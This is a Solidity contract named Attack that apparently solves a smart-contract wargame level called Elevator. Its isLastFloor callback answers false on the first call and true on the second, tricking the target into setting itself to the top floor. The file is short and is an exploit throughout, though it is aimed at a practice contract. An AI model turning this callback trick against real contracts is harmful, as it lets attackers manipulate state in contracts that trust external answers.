// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract Attack {
    Elevator elevator;
    bool public attacked = false;

    constructor(address _elevator) public {
        elevator = Elevator(_elevator);
    }

    function attack() public {
        elevator.goTo(100);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (attacked) {
            return true;
        } else {
            attacked = true;
            return false;
        }
    }
}
